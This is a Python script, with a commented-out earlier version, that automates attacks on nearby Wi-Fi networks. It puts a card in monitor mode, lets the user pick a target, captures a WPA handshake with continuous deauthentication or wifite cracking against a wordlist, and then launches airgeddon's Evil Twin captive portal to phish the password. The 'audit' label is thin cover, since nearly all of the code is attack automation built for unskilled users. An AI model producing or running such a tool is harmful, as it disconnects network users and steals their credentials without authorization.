# # coding: utf-8
# import os
# import sys
# import time
# import subprocess
# import signal

# # --- COLORS ---
# G = "\033[32m"
# R = "\033[31m"
# Y = "\033[33m"
# B = "\033[34m"
# W = "\033[0m"

# def cleanup(sig, frame):
#     print(f"\n{R}[!] Stopping attacks and cleaning virtual interfaces...{W}")
#     os.system("killall xterm dnsmasq hostapd aireplay-ng > /dev/null 2>&1")
#     os.system("sudo nmcli device set wlan0 managed yes > /dev/null 2>&1")
#     os.system("sudo service network-manager restart")
#     sys.exit(0)

# signal.signal(signal.SIGINT, cleanup)

# def get_target_info(interface):
#     os.system("clear")
#     print(f"{B}[*] SCANNING FOR TARGETS (15 SECONDS)...{W}")
#     print(f"{Y}[!] Look for the BSSID and Channel of your target Wi-Fi.{W}")
#     # Run scan in background
#     scan = subprocess.Popen(['xterm', '-T', 'SCANNING...', '-e', f'airodump-ng {interface}'])
#     time.sleep(15)
#     scan.terminate()
    
#     bssid = input(f"\n{G}Target BSSID: {W}")
#     channel = input(f"{G}Target Channel: {W}")
#     essid = input(f"{G}Target SSID (Name): {W}")
#     return bssid, channel, essid

# def start_one_adapter_attack():
#     if os.getuid() != 0:
#         print(f"{R}[!] Please run with sudo.{W}")
#         return

#     # 1. Prepare Adapter
#     phys_iface = input(f"{B}Enter your interface (e.g., wlan0): {W}")
#     os.system(f"sudo airmon-ng start {phys_iface}")
#     mon_iface = phys_iface + "mon"

#     # 2. Get Target
#     bssid, channel, essid = get_target_info(mon_iface)

#     # 3. Create Handshake (Required for verification)
#     print(f"\n{Y}[*] STEP 1: CAPTURING HANDSHAKE...{W}")
#     os.system(f"xterm -geometry 80x20+0+0 -T 'HANDSHAKE CAPTURE' -e 'airodump-ng -c {channel} --bssid {bssid} -w capture {mon_iface}' &")
#     os.system(f"xterm -geometry 80x10+0+400 -T 'DEAUTH' -e 'aireplay-ng -0 0 -a {bssid} {mon_iface}' &")
    
#     print(f"{G}[?] Watch the CAPTURE window. Once you see 'WPA Handshake' at the top...{W}")
#     input(f"{Y}Press Enter to transition to Evil Twin...{W}")
#     os.system("killall aireplay-ng airodump-ng")

#     # 4. Launch Airgeddon Evil Twin
#     # One-adapter mode in Airgeddon is the only robust way to handle 
#     # the timing issues of using a single card for AP + Deauth.
#     print(f"\n{B}[!] STEP 2: LAUNCHING EVIL TWIN PORTAL{W}")
#     print(f"{Y}[NOTE] Since you have 1 adapter, choose 'Internal' or 'Virtual' if prompted.{W}")
#     time.sleep(2)
    
#     # We launch airgeddon specifically into the Evil Twin menu
#     # You will select: 9 (Evil Twin) -> 2 (Captive Portal)
#     os.system("sudo airgeddon")

# if __name__ == "__main__":
#     start_one_adapter_attack()




# coding: utf-8
import os
import sys
import time
import subprocess

# --- STYLING ---
G = "\033[32m"  # Green
R = "\033[31m"  # Red
Y = "\033[33m"  # Yellow
B = "\033[34m"  # Blue
W = "\033[0m"   # White/Reset

def clear():
    os.system("clear")

def header():
    clear()
    print(f"{G}==================================================")
    print(f"        ONE-CLICK WIFI AUDIT SYSTEM (v3.0)        ")
    print(f"=================================================={W}")

def check_deps():
    print(f"{B}[*] Checking system readiness...{W}")
    # Essential tools for zero-knowledge automation
    tools = ["wifite", "airgeddon", "xterm", "hcxtools"]
    for tool in tools:
        status = subprocess.run(["which", tool], capture_output=True)
        if status.returncode != 0:
            print(f"{Y}[!] Installing {tool}...{W}")
            os.system(f"sudo apt-get install -y {tool} > /dev/null 2>&1")

def start_automation():
    if os.getuid() != 0:
        print(f"{R}[!] ERROR: You must run this as 'sudo'.{W}")
        return

    check_deps()
    header()
    
    # 1. Automatic Interface Setup
    print(f"{G}[1] Initializing Wireless Card...{W}")
    # This finds your wifi card automatically so you don't have to type 'wlan0'
    res = subprocess.check_output("nmcli -t -f DEVICE,TYPE device | grep wifi | cut -d: -f1", shell=True).decode().strip()
    iface = res.split('\n')[0] if res else input("Enter WiFi Interface Name: ")
    
    # 2. Automated Scan & Handshake
    print(f"{G}[2] Scanning for nearby Networks...{W}")
    print(f"{Y}    ACTION: Look for the target name. Note its number. {W}")
    print(f"{Y}    Then press CTRL+C to select it.{W}")
    time.sleep(3)
    
    # Wifite is perfect here because it shows names (SSIDs) and handles the BSSID/Channel internally
    # We tell it to only capture the handshake and then stop.
    os.system(f"sudo wifite --dict /usr/share/wordlists/rockyou.txt --kill --cracked")

    # 3. Transition to Evil Twin
    header()
    print(f"{G}[3] Handshake Captured!{W}")
    print(f"{B}    Now we will start the Fake Login Page (Evil Twin).{W}")
    print(f"\n{Y}INSTRUCTIONS FOR THE NEXT SCREEN:{W}")
    print(f"1. Choose your language.")
    print(f"2. Select 'Evil Twin attacks menu' (Option 9).")
    print(f"3. Select 'Captive portal access point attack' (Option 2).")
    print(f"4. Since you have 1 adapter, say YES to 'virtual interfaces'.")
    
    input(f"\n{G}Press ENTER to launch the Evil Twin...{W}")
    
    # Launching Airgeddon directly into the menu
    os.system("sudo airgeddon")

if __name__ == "__main__":
    try:
        start_automation()
    except KeyboardInterrupt:
        print(f"\n{R}[!] System Interrupted. Cleaning up...{W}")
        os.system("sudo service network-manager restart")
        sys.exit()
